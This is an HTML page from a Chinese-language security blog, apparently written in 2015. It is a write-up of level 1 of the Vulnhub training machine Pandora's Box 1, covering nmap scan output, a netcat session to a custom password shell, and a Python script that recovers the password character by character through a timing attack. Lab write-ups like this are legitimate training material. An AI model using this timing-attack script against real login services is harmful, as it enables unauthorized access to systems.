@@ -1,0 +1,331 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Pandora&#8217;s Box 1 - Level 1 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Pandora&rsquo;s Box 1，還是Vulnhub的Vulnerable Machine，作者是c0ne 先用nmap掃描目標，除了port 22的ssh之外，port 54311上也有執行程式 Starting Nmap 6.46 ( http://nmap.org ) at &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/03/12/pandora1_level1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Pandora&#8217;s Box 1 - Level 1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-12T22:15:48+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box 1</a>，還是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/c0ne,119/">c0ne</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>先用nmap掃描目標，除了port 22的ssh之外，port 54311上也有執行程式</p>
+
+<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-03 00:35 EST
+Nmap scan report for 192.168.2.158
+Host is up (0.00019s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol
+2.0)
+54311/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version,
+please submit the following fingerprint at http://www.insecure.org/cgi-bin/servi
+cefp-submit.cgi :
+SF-Port54311-TCP:V=6.46%I=7%D=1/3%Time=54A77FA8%P=x86_64-unknown-linux-gnu
+SF:%r(NULL,69,"#######################\n#\x20Secure\x20Remote\x20Shell\x20
+SF:#\n#######################\nWelcome,\x20please\x20log\x20in\nPassword:\
+SF:x20")%r(GenericLines,73,"#######################\n#\x20Secure\x20Remote
+SF:\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x20i
+SF:n\nPassword:\x20Password:\x20")%r(GetRequest,85,"######################
+SF:#\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWelcom
+SF:e,\x20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassword:
+SF:\x20")%r(HTTPOptions,85,"#######################\n#\x20Secure\x20Remote
+SF:\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x20i
+SF:n\nPassword:\x20Invalid\x20password!\nPassword:\x20")%r(RTSPRequest,85,
+SF:"#######################\n#\x20Secure\x20Remote\x20Shell\x20#\n########
+SF:###############\nWelcome,\x20please\x20log\x20in\nPassword:\x20Invalid\
+SF:x20password!\nPassword:\x20")%r(RPCCheck,85,"#######################\n#
+SF:\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWelcome,\x
+SF:20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassword:\x20
+SF:")%r(DNSVersionBindReq,73,"#######################\n#\x20Secure\x20Remo
+SF:te\x20Shell\x20#\n#######################\nWelcome,\x20please\x20log\x2
+SF:0in\nPassword:\x20Password:\x20")%r(DNSStatusRequest,73,"##############
+SF:#########\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################
+SF:\nWelcome,\x20please\x20log\x20in\nPassword:\x20Password:\x20")%r(Help,
+SF:85,"#######################\n#\x20Secure\x20Remote\x20Shell\x20#\n#####
+SF:##################\nWelcome,\x20please\x20log\x20in\nPassword:\x20Inval
+SF:id\x20password!\nPassword:\x20")%r(SSLSessionReq,A1,"##################
+SF:#####\n#\x20Secure\x20Remote\x20Shell\x20#\n#######################\nWe
+SF:lcome,\x20please\x20log\x20in\nPassword:\x20Invalid\x20password!\nPassw
+SF:ord:\x20Invalid\x20password!\nPassword:\x20")%r(Kerberos,8F,"##########
+SF:#############\n#\x20Secure\x20Remote\x20Shell\x20#\n###################
+SF:####\nWelcome,\x20please\x20log\x20in\nPassword:\x20Password:\x20Invali
+SF:d\x20password!\nPassword:\x20");
+MAC Address: 00:0C:29:35:8B:92 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.
+org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 196.78 seconds
+</code></pre>
+
+<p>連上54311後會看到要求輸入密碼</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/pandora# nc 192.168.2.158 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password:
+</code></pre>
+
+<p>盲目地試過一些弱密碼，也用了Kali Linux內建的rockyou.txt跑了一陣子都沒有效果</p>
+
+<p>在嘗試Buffer overflow時，發現密碼的長度在超過64個字之後，會回傳兩次的錯誤訊息</p>
+
+<p>而且還有一件更有趣的事情：每次送出密碼到回傳訊息之間的間隔時間似乎不太一樣</p>
+
+<p>這個看起來說不定能用跑起來非常帥氣的<a href="http://en.wikipedia.org/wiki/Timing_attack">Timing Attack</a>來解</p>
+
+<p>先寫一段簡單的code來跑看看每一個字元的花費時間</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+
+    <span class="kn">import</span> <span class="nn">string</span>
+    <span class="kn">import</span> <span class="nn">time</span>
+    <span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+    <span class="n">readable</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;192.168.2.158&#39;</span><span class="p">,</span> <span class="mi">54311</span><span class="p">))</span>
+    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">MAX_RUN</span><span class="o">=</span><span class="mi">6</span>
+    <span class="n">SendTime</span><span class="o">=</span><span class="p">{}</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">readable</span><span class="p">:</span>
+        <span class="n">SendTime</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mf">0.0</span>
+
+    <span class="k">for</span> <span class="n">count</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">MAX_RUN</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">readable</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+            <span class="n">start</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+            <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="n">SendTime</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
+                
+    <span class="n">curMin</span><span class="o">=</span><span class="mf">999.0</span>
+    <span class="n">curMinChar</span><span class="o">=</span><span class="s">&#39;-&#39;</span>
+    <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="n">SendTime</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
+        <span class="n">avg</span><span class="o">=</span><span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">MAX_RUN</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">avg</span> <span class="o">&lt;</span> <span class="n">curMin</span><span class="p">):</span>
+            <span class="n">curMin</span><span class="o">=</span><span class="n">avg</span>
+            <span class="n">curMinChar</span><span class="o">=</span><span class="n">x</span>
+    <span class="k">print</span> <span class="n">curMinChar</span> <span class="o">+</span> <span class="s">&quot;: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">curMin</span><span class="p">)</span></code></pre></div>
+
+
+<p>多跑個幾次之後，會發現每次出來的結果都是R的時間最短</p>
+
+<pre><code>R: 0.000167489051819
+R: 0.000175515810649
+R: 0.000179370244344
+R: 0.000188191731771
+</code></pre>
+
+<p>再來就把程式碼升級，讓猜測密碼的過程可以很帥氣地表現</p>
+
+<p>(這篇打完之後跑去看別人的writeup，發現了<a href="https://asciinema.org/">asciinema</a>這個好物，馬上套用XD)</p>
+
+<script type="text/javascript" src="https://asciinema.org/a/17955.js" id="asciicast-17955" async  data-size="small"></script>
+
+
+<p>進去後發現總共有五個level，而level2看來需要逆向工程一下，下次開新的一篇來寫</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-12T22:15:48+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:15 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/03/12/pandora1_level1/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/03/12/pandora1_level1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/07/brainpan2/" title="Previous Post: Brainpan 2">&laquo; Brainpan 2</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/03/23/pandora1_level2/" title="Next Post: Pandora's Box 1 - Level 2">Pandora&#8217;s Box 1 - Level 2 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
